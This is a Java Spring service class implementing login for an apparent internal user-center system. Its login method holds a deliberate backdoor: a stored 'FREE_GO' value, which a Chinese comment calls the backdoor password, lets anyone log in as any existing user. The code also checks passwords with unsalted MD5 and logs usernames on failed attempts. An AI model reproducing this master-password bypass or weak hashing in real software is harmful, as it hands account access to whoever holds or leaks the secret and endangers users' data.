package com.devops.suc.service.impl;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.devops.suc.dao.KeyValueSettingDao;
import com.devops.suc.dao.UserDao;
import com.devops.suc.model.User;
import com.devops.suc.service.SecurityService;
import com.idhoo.dhutil.dto.Result;
import com.idhoo.dhutil.dto.ResultCode;
import com.idhoo.dhutil.util.Authencation;
import com.idhoo.dhutil.util.AuthencationHelper;
import com.idhoo.dhutil.util.MD5;

/**
 * 
 * @author wangxichun
 *
 */
@Service
public class SecurityServiceImpl implements SecurityService {

	private final static Logger log = Logger.getLogger(SecurityServiceImpl.class);
	
	@Autowired
	private UserDao userDao;
	
	@Autowired
	private KeyValueSettingDao keyValueSettingDao;	
	
	@Override
	public User getAdmin(String userName) {
		User admin = new User();
		return admin;
	}

	@Override
	public Result login(String username, String password,HttpServletResponse response, HttpServletRequest request) {
		
		StringBuilder buff = new StringBuilder(200);
		Result result = new Result();
		result.setCode(ResultCode.SUCCESS);
		
		String pwd = keyValueSettingDao.get("FREE_GO").getValue();
		User admin = userDao.get(username);
		
		//如果用户不存在
		if(admin == null){
			result.setCode(ResultCode.FAILURE);
		}
		//用户存在，后门密码不对
		if(result.isSuccess()&&!MD5.getMD5(password).equals(pwd)){
			//用户本身密码不对 
			if(!admin.getPassword().equals(MD5.getMD5(password))){
				result.setCode(ResultCode.FAILURE);
			}
			
		}
		//用户验证密码不成功
		if(!result.isSuccess()){
			result.setCode(ResultCode.FAILURE);
			result.setMessage("登陆失败,用户或者密码错误");
			buff.append(",msg=<用户不存在>,username=<"+username+">");
			//去掉COOKIE中的信息，否则会取到前一个登录正常的用户信息
			AuthencationHelper.clearAllCookie(request,response);
			log.error(buff.toString());
			return result;
		}
		// 设置cookie
		Authencation auth = new Authencation(request, response);
		
		auth.saveUserName(admin.getUser_id(), admin.getUser_name(),admin.getNick_name());
		result.setCode(ResultCode.SUCCESS);
		result.setMessage("操作成功");
		buff.append(",登录成功");
		result.setObject(admin);
		log.info(buff.toString());
		return result;
	}
	
}
